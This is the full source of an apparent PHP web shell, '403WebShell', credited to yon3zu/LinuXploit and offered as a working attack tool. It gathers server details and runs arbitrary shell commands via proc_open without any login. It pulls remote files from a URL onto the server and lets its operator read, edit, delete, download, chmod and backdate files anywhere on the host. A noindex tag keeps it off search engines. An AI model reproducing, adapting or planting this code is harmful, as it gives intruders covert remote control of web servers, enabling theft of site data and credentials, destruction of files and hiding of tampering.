<!doctypehtml>
<html>
<head>
    <title>403WebShell</title>
    <meta content="noindex"name="robots"></head>
<body bgcolor="#1f1f1f"text="#ffffff">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"rel="stylesheet">
<style>
    @import url(https://fonts.googleapis.com/css?family=Dosis);@import url(https://fonts.googleapis.com/css?family=Bungee);@import url(https://fonts.googleapis.com/css?family=Russo+One);body{font-family:Consolas,cursive;text-shadow:0 0 1px #757575}body::-webkit-scrollbar{width:12px}body::-webkit-scrollbar-track{background:#1f1f1f}body::-webkit-scrollbar-thumb{background-color:#1f1f1f;border:3px solid gray}#content tr:hover{background-color:#636263;text-shadow:0 0 10px #fff}#content .first{background-color:#5e5e5e}#content .first:hover{background-color:#25383c;text-shadow:0 0 1px #757575}table{border:1px #000 dotted;table-layout:fixed}td{word-wrap:break-word}a{color:#df5;text-decoration:none}a:hover{color:#000;text-shadow:0 0 10px #fff}input,select,textarea{border:1px #000 solid;-moz-border-radius:5px;-webkit-border-radius:5px;border-radius:5px}.gas{background-color:#1f1f1f;color:#fff;cursor:pointer}select{background-color:transparent;color:#fff}select:after{cursor:pointer}.linka{background-color:transparent;color:#fff}.up{background-color:transparent;color:#fff}option{background-color:#1f1f1f}.btf{background:0 0;border:1px #fff solid;cursor:pointer}::-webkit-file-upload-button{background:0 0;color:#fff;border-color:#fff;cursor:pointer}
</style>
<center>
<?php
echo '<font face="Bungee" size="5">403Webshell</font>
</center>
<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';
set_time_limit(0);
error_reporting(0);
$m_821bfdba = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://" . $_SERVER["HTTP_HOST"];

if (empty(@ini_get("disable_functions"))) {
    $l_72c5a1bf = "<font color='#df5'>NONE</font>";
} else {
    $l_72c5a1bf = "<font color='red'>" . @ini_get("disable_functions") . "</font>";
}

function author() {
    echo "<center><br>Youez - 2016 - github.com/yon3zu<br><a href='https://linuxploit.com/' target='_blank'>LinuXploit</a></center>";
    die();
}

function cekdir()
{
    if (isset($_GET["loknya"])) {
        $a_40d8acc2 = $_GET["loknya"];
    } else {
        $a_40d8acc2 = getcwd();
    }
    if (is_writable($a_40d8acc2)) {
        return "<font color='green'>Writeable</font>";
    } else {
        return "<font color='red'>Writeable</font>";
    }
}

function crt()
{
    if (is_writable($_SERVER["DOCUMENT_ROOT"])) {
        return "<font color='green'>Writeable</font>";
    } else {
        return "<font color='red'>Writeable</font>";
    }
}

function xrd($x_b666e030)
{
    $y_e11ee94d = scandir($x_b666e030);
    foreach ($y_e11ee94d as $m_1f1b251e) {
        if ($m_1f1b251e === "." || $m_1f1b251e === "..") {
            continue;
        }
        $k_bfb08b47 = $x_b666e030 . "/" . $m_1f1b251e;
        if (is_dir($k_bfb08b47)) {
            xrd($k_bfb08b47);
        } else {
            unlink($k_bfb08b47);
        }
    }
    rmdir($x_b666e030);
}

function cfn($i_367af3ad)
{
    $y_6b9df6f = pathinfo(basename($i_367af3ad), PATHINFO_EXTENSION);
    if ($y_6b9df6f == "zip") {
        return '<i class="fa fa-file-zip-o" style="color: #d6d4ce"></i>';
    } elseif (
        preg_match("/jpeg|jpg|png|ico/im", $y_6b9df6f)
    ) {
        return '<i class="fa fa-file-image-o" style="color: #d6d4ce"></i>';
    } elseif ($y_6b9df6f == "txt") {
        return '<i class="fa fa-file-text-o" style="color: #d6d4ce"></i>';
    } elseif ($y_6b9df6f == "pdf") {
        return '<i class="fa fa-file-pdf-o" style="color: #d6d4ce"></i>';
    } elseif ($y_6b9df6f == "html") {
        return '<i class="fa fa-file-code-o" style="color: #d6d4ce"></i>';
    } else {
        return '<i class="fa fa-file-o" style="color: #d6d4ce"></i>';
    }
}

function ipsrv() {
    if (function_exists("gethostbyname")) {
        return gethostbyname($_SERVER["SERVER_NAME"]);
    } else {
        return gethostbyname($_SERVER["SERVER_ADDR"]);
    }
}

function ggr($i_367af3ad)
{
    if (function_exists("posix_getgrgid")) {
        if (!function_exists("filegroup")) {
            return "?";
        }
        $r_98dd4acc = posix_getgrgid(filegroup($i_367af3ad));
        if (empty($r_98dd4acc)) {
            $m_efda7a5a = filegroup($i_367af3ad);
            if (empty($m_efda7a5a)) {
                return "?";
            } else {
                return $m_efda7a5a;
            }
        } else {
            return $r_98dd4acc["name"];
        }
    } elseif (function_exists("filegroup")) {
        return filegroup($i_367af3ad);
    } else {
        return "?";
    }
}

function gor($i_367af3ad) {
    if (function_exists("posix_getpwuid")) { 
        if (!function_exists("fileowner")) { 
            return "?"; 
        } 
        $r_98dd4acc = posix_getpwuid(fileowner($i_367af3ad)); 
        if (empty($r_98dd4acc)) { 
            $m_efda7a5a = fileowner($i_367af3ad); 
            if (empty($m_efda7a5a)) { 
                return "?"; 
            } else { 
                return $m_efda7a5a; 
            } 
        } else { 
            return $r_98dd4acc["name"]; 
        } 
    } elseif (function_exists("fileowner")) { 
        return fileowner($i_367af3ad); 
    } else { 
        return "?"; 
    } 
}

function fdt($i_367af3ad) {
    return date("F d Y H:i:s", filemtime($i_367af3ad));
}

function dunlut($i_367af3ad)
{
    if (file_exists($i_367af3ad) && isset($i_367af3ad)) {
        header("Content-Description: File Transfer");
        header("Content-Control: public");
        header("Content-Type: application/octet-stream");
        header('Content-Disposition: attachment; filename="' . basename($i_367af3ad) . '"');
        header("Expires: 0");
        header("Expired: 0");
        header("Cache-Control: must-revalidate");
        header("Content-Transfer-Encoding: binary");
        header("Pragma: public");
        header("Content-Length: " . filesize($i_367af3ad));
        flush();
        readfile($i_367af3ad);
        die();
    } else {
        return "File Not Found !";
    }
}

function komend($b_6aa5975e, $r_52f18e84)
{
    if (!preg_match("/" . "2>&1" . "/i", $b_6aa5975e)) {
        $b_6aa5975e = $b_6aa5975e . " " . "2>&1";
    }
    if (function_exists("proc_open")) {
        $q_a7ea4b8f = proc_open(
            $b_6aa5975e,
            [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "r"],
            ],
            $d_14739299,
            $r_52f18e84
        );
        return "<pre>" . htmlspecialchars(stream_get_contents($d_14739299[1])) . "</pre>";
    } else {
        return "proc_open function is disabled !";
    }
}

function green($f_3b8ba7c7) {
    echo "<center><font color='green'>" . $f_3b8ba7c7 . "</center></font>";
}

function red($f_3b8ba7c7) {
    echo "<center><font color='red'>" . $f_3b8ba7c7 . "</center></font>";
}

function oren($f_3b8ba7c7) {
    return "<center><font color='orange'>" . $f_3b8ba7c7 . "</center></font>";
}

function tuls($w_89a44933, $r_52f18e84)
{
    return "[ <a href='" . $r_52f18e84 . "'>" . $w_89a44933 . "</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
}

echo "Server IP : <font color=#df5>" . ipsrv() . "</font> &nbsp;/&nbsp; Your IP : <font color=#df5>" . $_SERVER["REMOTE_ADDR"] . "</font><br>";
echo "Web Server : <font color='#df5'>" . $_SERVER["SERVER_SOFTWARE"] . "</font><br>";
echo "System : <font color='#df5'>" . @php_uname() . "</font><br>";
echo "User : <font color='#df5'>" . @get_current_user() . "&nbsp;</font>( <font color='#df5'>" . @getmyuid() . "</font>)<br>";
echo "PHP Version : <font color='#df5'>" . @phpversion() . "</font><br>";
echo "Disable Function : " . $l_72c5a1bf . "</font><br>";
echo "MySQL : ";

if (@function_exists("mysql_connect")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}

echo "&nbsp;|&nbsp; cURL : ";

if (@function_exists("curl_init")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo "&nbsp;|&nbsp; WGET : ";

if (@file_exists("/usr/bin/wget")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}

echo "&nbsp;|&nbsp; Perl : ";

if (@file_exists("/usr/bin/perl")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}

echo "&nbsp;|&nbsp; Python : ";

if (@file_exists("/usr/bin/python2")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}

echo "&nbsp;|&nbsp; Sudo : ";
if (@file_exists("/usr/bin/sudo")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}

echo "&nbsp;|&nbsp; Pkexec : ";
if (@file_exists("/usr/bin/pkexec")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo "<br>Directory : &nbsp;";

foreach ($_POST as $q_8a90aba9 => $b_1d775834) {
    $_POST[$q_8a90aba9] = stripslashes($b_1d775834);
}

if (isset($_GET["loknya"])) {
    $a_40d8acc2 = $_GET["loknya"];
    $j_1e92419d = $_GET["loknya"];
} else {
    $a_40d8acc2 = getcwd();
    $j_1e92419d = getcwd();
}
$a_40d8acc2 = str_replace("\\", "/", $a_40d8acc2);
$v_6e24b43b = explode("/", $a_40d8acc2);
$u_61d14724 = scandir($a_40d8acc2);

foreach ($v_6e24b43b as $s_bf396750 => $p_868924ee) {
    if ($p_868924ee == "" && $s_bf396750 == 0) {
        $a_e8b7be43 = true;
        echo '<a href="?loknya=/">/</a>';
        continue;
    }
    if ($p_868924ee == "") {
        continue;
    }
    echo '<a href="?loknya=';
    for ($l_e66c3671 = 0; $l_e66c3671 <= $s_bf396750; $l_e66c3671++) {
        echo $v_6e24b43b[$l_e66c3671];
        if ($l_e66c3671 != $s_bf396750) {
            echo "/";
        }
    }
    echo '">' . $p_868924ee . "</a>/";
}
echo "</td></tr><tr><td><br>";

if (isset($_POST["upwkwk"])) {
    if (isset($_POST["berkasnya"])) {
        if ($_POST["dirnya"] == "2") {
            $a_40d8acc2 = $_SERVER["DOCUMENT_ROOT"];
        }
        if (empty($_FILES["berkas"]["name"])) {
            echo "<font color=orange>File not Selected !</font><br><br>";
        } else {
            $s_adf3f363 = @file_put_contents($a_40d8acc2 . "/" . $_FILES["berkas"]["name"], @file_get_contents(
$_FILES["berkas"]["tmp_name"]));

            if (file_exists($a_40d8acc2 . "/" . $_FILES["berkas"]["name"])) {
                $i_367af3ad = $a_40d8acc2 . "/" . $_FILES["berkas"]["name"];
                echo "File Uploaded ! &nbsp;<font color='gold'><i>" . $i_367af3a . "</i></font><br>";
                
                if (strpos($a_40d8acc2, $_SERVER["DOCUMENT_ROOT"]) !== false) {
                    $l_7d4e0413 = str_replace($_SERVER["DOCUMENT_ROOT"], $m_821bfdba . "/", $i_367af3ad);
                    echo "Link : <a href='" . $l_7d4e0413 . "'><font color='#df5'>" . $l_7d4e0413 . "</font></a><br>";
                }
                echo "<br>";
            } else {
                echo "<font color='red'>Failed to Upload !</font><br><br>";
            }
        }
    } elseif (isset($_POST["linknya"])) {
        if (empty($_POST["namalink"])) {
            echo "<font color=orange>Filename cannot be empty !</font><br><br>";
        } elseif (empty($_POST["darilink"])) {
            echo "<font color=orange>Link cannot be empty !</font><br><br>";
        } else {
            if ($_POST["dirnya"] == "2") {
                $a_40d8acc2 = $_SERVER["DOCUMENT_ROOT"];
            }

            $s_adf3f363 = @file_put_contents($a_40d8acc2 . "/" . $_POST["namalink"], @file_get_contents($_POST["darilink"]));
            
            if (file_exists($a_40d8acc2 . "/" . $_POST["namalink"])) {
                $i_367af3ad = $a_40d8acc2 . "/" . $_POST["namalink"];
                echo "File Uploaded ! &nbsp;<font color='#df5'><i>" . $i_367af3ad . "</i></font><br>";
                
                if (strpos($a_40d8acc2, $_SERVER["DOCUMENT_ROOT"]) !== false) {
                    $l_7d4e0413 = str_replace($_SERVER["DOCUMENT_ROOT"], $m_821bfdba . "/", $i_367af3ad);
                    echo "Link : <a href='" . $l_7d4e0413 . "'><font color='#df5'>" . $l_7d4e0413 . "</font></a><br>";
                }
                echo "<br>";
            } else {
                echo "<font color='red'>Failed to Upload !</font><br><br>";
            }
        }
    }
}

echo "Upload File : ";
echo '<form enctype="multipart/form-data" method="post">
<input type="radio" value="1" name="dirnya" checked>current_dir [ ' . cekdir() . '] <input type="radio" value="2" name="dirnya" >document_root [ ' .
crt() . ']
    <br>
    <input type="hidden" name="upwkwk" value="aplod">
    <input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
    <input type="text" name="darilink" class="up" placeholder="https://linuxploit.com/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="5" placeholder="kerang.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
    </form>';

echo '<br><form method="post" enctype="application/x-www-form-urlencoded">
Command : <input type="text" name="komend" class="up" style="cursor: pointer; border-color: #000" value="' .
htmlspecialchars($_POST['komend']) . '">
<input type="submit" name="komends" value=">>" class="up" style="cursor: pointer; border-color: #fff">
</form>';

echo "</table><br>";
echo '<hr><center style="font-family: Russo One">';
echo tuls("Back", $_SERVER["SCRIPT_NAME"]);
echo "<hr></center><br>";

if (isset($_GET["lokasie"])) { 
    echo "<tr><td>Current File : " . $_GET["lokasie"]; 
    echo "</tr></td></table><br/>"; 
    echo "<pre>" . htmlspecialchars(file_get_contents($_GET["lokasie"])) . "</pre>"; 
    author(); 
} elseif (isset($_POST["loknya"]) && $_POST["pilih"] == "hapus") { 
    if (is_dir($_POST["loknya"]) && file_exists($_POST["loknya"])) { 
        
        xrd($_POST["loknya"]); 

        if (file_exists($_POST["loknya"])) { 
            red("Failed to delete Directory !");
        } else { 
            green("Delete Directory Success !");
        } 
    } elseif (is_file($_POST["loknya"]) && file_exists($_POST["loknya"])) { 
       
        @unlink($_POST["loknya"]); 
        if (file_exists($_POST["loknya"])) { 
            red("Failed to Delete File !");
        } else { 
            green("Delete File Success !" );
        } 
    } else { 
        red("File / Directory not Found !");
    } 
} elseif (isset($_GET["pilihan"]) && $_POST["pilih"] == "ubahmod") { 

    if (!isset($_POST["cemod"])) {
        if ($_POST["type"] == "file") {
            echo "<center>File : " . htmlspecialchars($_POST["loknya"]) . "<br>";
        } else {
            echo "<center>Dir : " . htmlspecialchars($_POST["loknya"]) . "<br>";
        } 
        echo '<form method="post">Permission : <input name="perm" type="text" class="up" size="4" maxlength="4" value="' . substr(sprintf("%o", fileperms($_POST["loknya"])), -4) . '" /><input type="hidden" name="loknya" value="' . $_POST["loknya"] . '"><input type="hidden" name="pilih" value="ubahmod">'; 
        if ($_POST["type"] == "file") { 
            echo '<input type="hidden" name="type" value="file">'; 
        } else { 
            echo '<input type="hidden" name="type" value="dir">'; 
        } 
        echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/></form><br>';
    } else { 
        $w_3c0a377e = @chmod($_POST["loknya"], octdec($_POST["perm"]));
        if ($w_3c0a377e == true) { 
            green("Change Mod Success !"); 
            if ($_POST["type"] == "file") { 
                echo "<center>File : " . htmlspecialchars($_POST["loknya"]) . "<br>"; 
            } else { 
                echo "<center>Dir : " . htmlspecialchars($_POST["loknya"]) . "<br>"; 
            } 
            echo '<form method="post">Permission : <input name="perm" type="text" class="up" size="4" maxlength="4" value="' . substr(sprintf("%o", fileperms($_POST["loknya"])), -4) . '" /><input type="hidden" name="loknya" value="' . $_POST["loknya"] . '"><input type="hidden" name="pilih" value="ubahmod">';
            
            if ($_POST["type"] == "file") { 
                echo '<input type="hidden" name="type" value="file">';
            } else { 
                echo '<input type="hidden" name="type" value="dir">';
            } 
            echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/></form><br>'; 
        } else { 
            red("Change Mod Failed !");
            if ($_POST["type"] == "file") { 
                echo "<center>File : " . htmlspecialchars($_POST["loknya"]) . "<br>";
            } else { 
                echo "<center>Dir : " . htmlspecialchars($_POST["loknya"]) . "<br>";
            } 
            echo '<form method="post">Permission : <input name="perm" type="text" class="up" size="4" maxlength="4" value="' . 
                substr(sprintf("%o", fileperms($_POST["loknya"])), -4) . '" /><input type="hidden" name="loknya" value="' . 
                $_POST["loknya"] . '"><input type="hidden" name="pilih" value="ubahmod">'; 
            if ($_POST["type"] == "file") { 
                echo '<input type="hidden" name="type" value="file">'; 
            } else { 
                echo '<input type="hidden" name="type" value="dir">'; 
            } 
            echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/></form><br>';
        } 
    } 
} elseif (isset($_POST["loknya"]) && $_POST["pilih"] == "ubahnama") { 
    if (isset($_POST["gantin"])) { 
        $p_78e66890 = $_GET["loknya"] . "/" . $_POST["newname"]; 
        
        if (@rename($_POST["loknya"], $p_78e66890) === true) { 
            green("Change Name Success");

            if ($_POST["type"] == "file") { 
                echo "<center>File : " . htmlspecialchars($_POST["loknya"]) . "<br>"; 
            } else { 
                echo "<center>Dir : " . htmlspecialchars($_POST["loknya"]) . "<br>"; 
            } 
            echo '<form method="post">New Name : <input name="newname" type="text" class="up" size="20" value="' . htmlspecialchars($_POST["newname"]) . '" /><input type="hidden" name="loknya" value="' . $_POST["newname"] . '"><input type="hidden" name="pilih" value="ubahnama">';
            if ($_POST["type"] == "file") { 
                echo '<input type="hidden" name="type" value="file">'; 
            } else { 
                echo '<input type="hidden" name="type" value="dir">';
            } 
            echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/></form><br>'; 
        } else { 
            red("Change Name Failed");
        } 
    } else { 
        if ($_POST["type"] == "file") { 
            echo "<center>File : " . htmlspecialchars($_POST["loknya"]) . "<br>";
        } else { 
            echo "<center>Dir : " . htmlspecialchars($_POST["loknya"]) . "<br>";
        } 
        echo '<form method="post">New Name : <input name="newname" type="text" class="up" size="20" value="' . htmlspecialchars(basename($_POST["loknya"])) . '" /><input type="hidden" name="loknya" value="' . $_POST["loknya"] . '"><input type="hidden" name="pilih" value="ubahnama">';
        
        if ($_POST["type"] == "file") { 
            echo '<input type="hidden" name="type" value="file">';
        } else { 
            echo '<input type="hidden" name="type" value="dir">';
        } 
        echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/></form><br>';
    } 
} elseif (isset($_GET["pilihan"]) && $_POST["pilih"] == "edit") { 
    
    if (isset($_POST["gasedit"])) { 
        $t_8135de1a = @file_put_contents($_POST["loknya"], $_POST["src"]);
        
        if (file_get_contents($_POST["loknya"]) == $_POST["src"]) { 
            green("Edit File Success !");
        } else { 
            red("Edit File Failed !");
        } 
    }

    echo "<center>File : " . htmlspecialchars($_POST["loknya"]) . "<br><br>"; 
    echo '<form method="post"><textarea cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($_POST["loknya"])) . '</textarea><br><input type="hidden" name="loknya" value="' . $_POST["loknya"] . 
        '">
        <input type="hidden" name="pilih" value="edit">
        <input type="submit" value="Edit File" name="gasedit" class="up" style="cursor: pointer; border-color: #fff"/>
        </form><br>'; 
} elseif (isset($_POST["komends"])) { 
    if (isset($_POST["komend"])) { 
        if (isset($_GET["loknya"])) { 
            $r_52f18e84 = $_GET["loknya"]; 
        } else { 
            $r_52f18e84 = getcwd(); 
        } 
        echo komend($_POST["komend"], $r_52f18e84); 
        die(); 
    } 
} elseif (isset($_POST["loknya"]) && $_POST["pilih"] == "ubahtanggal") { 
    if (isset($_POST["tanggale"])) { 
        $l_62611df4 = strtotime($_POST["tanggal"]); 
        if (@touch($_POST["loknya"], $l_62611df4) === true) { 
            green("Change Date Success !");
            $g_71beeff9 = date("d F Y H:i:s", filemtime($_POST["loknya"]));
            if ($_POST["type"] == "file") { 
                echo "<center>File : " . htmlspecialchars($_POST["loknya"]) . "<br>";
            } else { 
                echo "<center>Dir : " . htmlspecialchars($_POST["loknya"]) . "<br>";
            } 
            echo '<form method="post">New Date : <input name="tanggal" type="text" class="up" size="20" value="' . $g_71beeff9 . '" /><input type="hidden" name="loknya" value="' . $_POST["loknya"] . '"><input type="hidden" name="pilih" value="ubahtanggal">'; 
            if ($_POST["type"] == "file") { 
                echo '<input type="hidden" name="type" value="file">'; 
            } else { 
                echo '<input type="hidden" name="type" value="dir">'; 
            } 
            echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/></form><br>';
        } else { 
            red("Failed to Change Date !");
        } 
    } else { 
        $g_71beeff9 = date("d F Y H:i:s", filemtime($_POST["loknya"]));
        if ($_POST["type"] == "file") { 
            echo "<center>File : " . htmlspecialchars($_POST["loknya"]) . "<br>";
        } else { 
            echo "<center>Dir : " . htmlspecialchars($_POST["loknya"]) . "<br>";
        } 
        echo '<form method="post">New Date : <input name="tanggal" type="text" class="up" size="20" value="' . $g_71beeff9 . '" /><input type="hidden" name="loknya" value="' . $_POST["loknya"] . '"><input type="hidden" name="pilih" value="ubahtanggal">'; 
        
        if ($_POST["type"] == "file") { 
            echo '<input type="hidden" name="type" value="file">';
        } else { 
            echo '<input type="hidden" name="type" value="dir">';
        } 
        echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/></form><br>';
    } 
} elseif (isset($_POST["loknya"]) && $_POST["pilih"] == "dunlut") { 
    $v_ca3929f3 = $_POST["loknya"]; 
    if (file_exists($v_ca3929f3) && isset($v_ca3929f3)) { 
        if (is_readable($v_ca3929f3)) { 
            dunlut($v_ca3929f3); 
        } elseif (is_dir($i_367af3ad)) { 
            red("That is Directory, Not File -_-");
        } else { 
            red("File is Not Readable !");
        } 
    } else { 
        red("File Not Found !"); 
    } 
} elseif (isset($_POST["loknya"]) && $_POST["pilih"] == "folder") { 
    if (is_writable("./") || is_readable("./")) { 
        $w_a8ee3c01 = $_POST["loknya"]; 

        if (isset($_POST["buatfolder"])) { 
            $n_dfa65a16 = mkdir($w_a8ee3c01 . "/" . $_POST["folderbaru"]);

            if ($n_dfa65a16 == true) { 
                green("Folder <b>" . htmlspecialchars($_POST["folderbaru"]) . "</b> Created !" ); 
                echo '<form method="post"><center>Folder : <input type="text" name="folderbaru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>'; 
                echo '<input type="hidden" name="loknya" value="' . $_POST["loknya"] . '"><input type="hidden" name="pilih" value="folder"></form>'; 
            } else { 
                red("Failed to Create folder !");
                echo '<form method="post"><center>Folder : <input type="text" name="folderbaru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="' . $_POST["loknya"] . '"><input type="hidden" name="pilih" value="folder"></form>'; 
            } 
        } else { 
            echo '<form method="post"><center>Folder : <input type="text" name="folderbaru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
            echo '<input type="hidden" name="loknya" value="' . $_POST["loknya"] . '"><input type="hidden" name="pilih" value="folder"></form>'; 
        } 
    } 
} elseif (isset($_POST["loknya"]) && $_POST["pilih"] == "file") { 
    if (is_writable("./") || is_readable("./")) { 
        $w_a8ee3c01 = $_POST["loknya"]; 
        
        if (isset($_POST["buatfile"])) { 
            $n_dfa65a16 = file_put_contents($w_a8ee3c01 . "/" . $_POST["filebaru"], "");
            
            if (file_exists($w_a8ee3c01 . "/" . $_POST["filebaru"])) { 
                green("File <b>" . htmlspecialchars($_POST["filebaru"]) . "</b> Created !" ); 
                echo '<form method="post"><center>Filename : <input type="text" name="filebaru" class="up"> <input type="submit" name="buatfile" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="' . $_POST["loknya"] . '"><input type="hidden" name="pilih" value="file"></form>';
            } else { 
                red("Failed to Create File !");
                echo '<form method="post"><center>Filename : <input type="text" name="filebaru" class="up"> <input type="submit" name="buatfile" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
                echo '<input type="hidden" name="loknya" value="' . $_POST["loknya"] . '"><input type="hidden" name="pilih" value="file"></form>';
            } 
        } else { 
            echo '<form method="post"><center>Filename : <input type="text" name="filebaru" class="up"> <input type="submit" name="buatfile" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>'; 
            echo '<input type="hidden" name="loknya" value="' . $_POST["loknya"] . '"><input type="hidden" name="pilih" value="file"></form>';
        } 
    } 
}

echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Last Modified</center></td>
<td><center>Owner / Group</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';
echo "<tr>";

$j_4be4c131 = str_replace(basename($a_40d8acc2), "", $a_40d8acc2);
$j_4be4c131 = str_replace("//", "/", $j_4be4c131);

echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href='?loknya='" . $j_4be4c131 . "'>..</a></td><td><center>--</center></td><td><center>" . fdt($j_4be4c131) ."</center></td><td><center>" . gor($j_4be4c131) . "/ ". ggr($j_4be4c131) . "</center></td><td><center>";

if (is_writable($j_4be4c131)) {
    echo '<font color="green">';
} elseif (!is_readable($j_4be4c131)) {
    echo '<font color="red">';
}
echo statusnya($j_4be4c131);

if (is_writable($j_4be4c131) || !is_readable($j_4be4c131)) {
    echo "</font>";
}

echo "</center></td>
<td><center><form method='POST' action='?pilihan&loknya={$a_40d8acc2}'><input type='hidden' name='type' value='dir'><input type='hidden' name='name' value='{$v_3b9afb6d}'><input type='hidden' name='loknya' value='{$a_40d8acc2}/{$v_3b9afb6d}'>
<button type='submit' class='btf' name='pilih' value='folder'><i class='fa fa-folder' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='file'><i class='fa fa-file' style='color: #fff'></i></button>
</form></center>";
echo "</tr>";

foreach ($u_61d14724 as $v_3b9afb6d) {
    $e_a57c2e0e = $a_40d8acc2 . "/" . $v_3b9afb6d;
    $e_a57c2e0e = str_replace("//", "/", $e_a57c2e0e);
    
    if (!is_dir($e_a57c2e0e) || $v_3b9afb6d == "." || $v_3b9afb6d == "..") {
        continue;
    }
    echo "<tr>";
    echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href='?loknya=" . $e_a57c2e0e . "'>" . $v_3b9afb6d . "</a></td><td><center>--</center></td><td><center>" . fdt($e_a57c2e0e) . "</center></td><td><center>" . gor($e_a57c2e0e) . "/ " . ggr($e_a57c2e0e) . "</center></td><td><center>";
    
    if (is_writable($e_a57c2e0e)) {
        echo '<font color="green">';
    } elseif (!is_readable($e_a57c2e0e)) {
        echo '<font color="red">';
    }

    echo statusnya($e_a57c2e0e);
    
    if (is_writable($e_a57c2e0e) || !is_readable($e_a57c2e0e)) {
        echo "</font>";
    }

    echo "</center></td><td><center><form method='POST' action='?pilihan&loknya={$a_40d8acc2}'><input type='hidden' name='type' value='dir'><input type='hidden' name='name' value='{$v_3b9afb6d}'><input type='hidden' name='loknya' value='{$a_40d8acc2}/{$v_3b9afb6d}'>
	<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
	</form></center></td>
	</tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
$y_65201836 = "1024";

foreach ($u_61d14724 as $y_ae0d5c41) {
    $f_78aab238 = $a_40d8acc2 . "/" . $y_ae0d5c41;

    if (!is_file("{$a_40d8acc2}/{$y_ae0d5c41}")) {
        continue;
    }

    $o_f7c0246a = filesize("{$a_40d8acc2}/{$y_ae0d5c41}") / $y_65201836;
    $o_f7c0246a = round($o_f7c0246a, 3);
    if ($o_f7c0246a >= $y_65201836) {
        $o_f7c0246a = round($o_f7c0246a / $y_65201836, 2) . "M" . "B";
    } else {
        $o_f7c0246a = $o_f7c0246a . "K" . "B";
    }
    
    echo "<tr><td>" . cfn($f_78aab238) . "<a href='?lokasie={$a_40d8acc2}/{$y_ae0d5c41}&loknya={$a_40d8acc2}'>{$y_ae0d5c41}</a></td><td><center>" . $o_f7c0246a . "</center></td><td><center>" . fdt($f_78aab238) . "</center></td><td><center>" . gor($f_78aab238) . "/ " . ggr($f_78aab238) . "</center></td><td><center>";

    if (is_writable("{$a_40d8acc2}/{$y_ae0d5c41}")) {
        echo '<font color="green">';
    } elseif (!is_readable("{$a_40d8acc2}/{$y_ae0d5c41}")) {
        echo '<font color="red">';
    }

    echo statusnya("{$a_40d8acc2}/{$y_ae0d5c41}");

    if (is_writable("{$a_40d8acc2}/{$y_ae0d5c41}") ||!is_readable("{$a_40d8acc2}/{$y_ae0d5c41}")) {
        echo "</font>";
    }

    echo "</center></td><td><center><form method='post' action='?pilihan&loknya={$a_40d8acc2}'>
    <button type='submit' class='btf' name='pilih' value='edit'><i class='fa fa-edit' style='color: #fff'></i></button>
    <button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
    <button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
    <button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
    <button type='submit' class='btf' name='pilih' value='dunlut'><i class='fa fa-download' style='color: #fff'></i></button>
    <button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
    <input type='hidden' name='type' value='file'>
    <input type='hidden' name='name' value='{$y_ae0d5c41}'><input type='hidden' name='loknya' value='{$a_40d8acc2}/{$y_ae0d5c41}'></form></center></td></tr>";
}

echo "</tr></td></table></table>";

author();

